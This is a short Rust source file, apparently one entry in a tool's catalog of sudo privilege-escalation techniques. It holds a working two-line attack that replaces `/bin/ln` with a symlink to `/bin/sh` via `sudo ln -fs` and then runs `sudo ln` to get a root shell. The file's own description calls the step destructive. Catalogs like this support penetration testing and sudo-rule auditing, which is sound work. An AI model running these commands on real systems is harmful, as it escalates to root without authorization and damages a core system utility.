pub static BIN_NAME: &'static str = "ln";
pub static BIN_DESC: &'static str = "This overrides `ln` itself with a symlink to a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `ln` by path. Warning, this is a destructive action.";
pub static SUDO_CODE: &'static str = r#"
    
    sudo ln -fs /bin/sh /bin/ln
    sudo ln
"#;
use crate::code::{Code, Tag};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
